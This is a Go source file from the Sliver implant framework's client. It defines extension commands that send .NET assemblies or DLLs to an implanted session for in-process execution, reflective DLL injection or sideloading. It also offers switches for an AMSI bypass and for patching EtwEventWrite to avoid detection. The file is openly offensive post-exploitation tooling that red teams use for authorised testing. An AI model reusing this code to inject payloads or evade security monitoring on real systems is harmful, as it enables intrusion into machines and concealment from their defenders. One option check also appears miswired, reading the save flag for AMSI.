package commands

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"strings"

	cctx "github.com/bishopfox/sliver/client/context"
	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/client/util"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	// LoadedExtensions - All extensions previously loaded by this client
	// Each of these functions yields new commands to the session command parser.
	LoadedExtensions = map[string]func(){}
)

// ExtensionCommand - Each command found in an extension manifest is translated
// into such a type, so that we can register it to the go-flags parser.
type ExtensionCommand struct {
	ExtensionArgs `positional-args:"yes"`
	root          *extension        // The root extension object (not command)
	sub           *extensionCommand // The command has its own extension fields.
}

// ExtensionArgs - An extension command may accept arguments
type ExtensionArgs struct {
	Args []string `description:"(optional) command arguments"`
}

// ExtensionOptions - Base options for loading an extension command
type ExtensionOptions struct {
	Path string `long:"process" short:"p" description:"path to process to host the shared object"`
	Save bool   `long:"save" short:"s" description:"save command output to disk"`
}

// ExtensionLibraryOptions - The extension is an assembly library.
// This option group is dynamically loaded by an extension command.
type ExtensionLibraryOptions struct {
	AMSI          bool `long:"amsi" short:"a" description:"use AMSI bypass (disabled by default)"`
	EtwEventWrite bool `long:"etw" short:"e" description:"patch EtwEventWrite function to avoid detection (disabled by default)"`
}

// Execute - The extension command works like a normal command.
func (ext *ExtensionCommand) Execute(cArgs []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	binPath, err := ext.root.getFileForTarget(ext.sub.Name, session.GetOS(), session.GetArch())
	if err != nil {
		fmt.Printf(util.Error+"Error: %v\n", err)
		return
	}

	var args string
	if len(ext.sub.DefaultArgs) != 0 {
		args = ext.sub.DefaultArgs
	}
	if ext.sub.AllowArgs {
		if len(ext.Args) > 0 {
			args = strings.Join(ext.Args[0:], " ")
		}
	}

	// Find command and subcommand for extension
	// (we cannot be in a root command Execute() when being an extension)
	root := Sliver.Find(ext.root.Name)
	sub := root.Find(ext.sub.Name)

	entryPoint := ext.sub.Entrypoint
	processName := ""

	proc := sub.FindOptionByLongName("process")
	if proc == nil {
		processName, err = ext.sub.getDefaultProcess(session.GetOS())
		if err != nil {
			fmt.Printf(util.Error+"Error: %v\n", err)
			return
		}
	}

	binData, err := ioutil.ReadFile(binPath)
	if err != nil {
		fmt.Printf(util.Error+"%s", err.Error())
		return
	}

	// Save output option
	var outFilePath *os.File
	save := sub.FindOptionByLongName("save")
	if save != nil && save.Value().(string) != "" {
		outFile := path.Base(fmt.Sprintf("%s_%s*.log", ext.sub.Name, session.GetHostname()))
		outFilePath, err = ioutil.TempFile("", outFile)
	}

	// Assembly injection
	if ext.sub.IsAssembly {
		// Get specific options
		var amsi, etw bool
		amsiOpt := sub.FindOptionByLongName("amsi")
		if amsiOpt != nil && save.Value().(bool) == true {
			amsi = true
		}
		etwOpt := sub.FindOptionByLongName("etw")
		if etwOpt != nil && etwOpt.Value().(bool) == true {
			etw = true
		}

		ctrl := make(chan bool)
		msg := fmt.Sprintf("Executing %s %s ...", ext.sub.Name, args)
		go spin.Until(msg, ctrl)
		executeAssemblyResp, err := transport.RPC.ExecuteAssembly(context.Background(), &sliverpb.ExecuteAssemblyReq{
			AmsiBypass: amsi,
			EtwBypass:  etw,
			Arguments:  args,
			Assembly:   binData,
			Process:    processName,
			Request:    ContextRequest(session),
		})
		ctrl <- true
		<-ctrl
		if err != nil {
			fmt.Printf(util.Error+"Error: %v", err)
			return nil
		}
		fmt.Printf(util.Info+"Output:\n%s", string(executeAssemblyResp.GetOutput()))
		if outFilePath != nil {
			outFilePath.Write(executeAssemblyResp.GetOutput())
			fmt.Printf(util.Info+"Output saved to %s\n", outFilePath.Name())
		}
		return nil
	}

	// Reflective DLL injection
	if ext.sub.IsReflective {
		ctrl := make(chan bool)
		msg := fmt.Sprintf("Executing %s %s ...", ext.sub.Name, args)
		go spin.Until(msg, ctrl)
		spawnDllResp, err := transport.RPC.SpawnDll(context.Background(), &sliverpb.InvokeSpawnDllReq{
			Args:        strings.Trim(args, " "),
			Data:        binData,
			ProcessName: processName,
			EntryPoint:  ext.sub.Entrypoint,
			Request:     ContextRequest(session),
		})
		ctrl <- true
		<-ctrl

		if err != nil {
			fmt.Printf(util.Error+"Error: %v", err)
			return nil
		}

		fmt.Printf(util.Info+"Output:\n%s", spawnDllResp.GetResult())
		if outFilePath != nil {
			outFilePath.Write([]byte(spawnDllResp.GetResult()))
			fmt.Printf(util.Info+"Output saved to %s\n", outFilePath.Name())
		}
		return nil
	}

	// By default, the extension sideloads the library
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Executing %s %s ...", ext.sub.Name, args)
	go spin.Until(msg, ctrl)
	sideloadResp, err := transport.RPC.Sideload(context.Background(), &sliverpb.SideloadReq{
		Args:        args,
		Data:        binData,
		EntryPoint:  entryPoint,
		ProcessName: processName,
		Request:     ContextRequest(session),
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		fmt.Printf(util.Error+"Error: %v", err)
		return nil
	}

	fmt.Printf(util.Info+"Output:\n%s", sideloadResp.GetResult())
	if outFilePath != nil {
		outFilePath.Write([]byte(sideloadResp.GetResult()))
		fmt.Printf(util.Info+"Output saved to %s\n", outFilePath.Name())
	}

	return
}
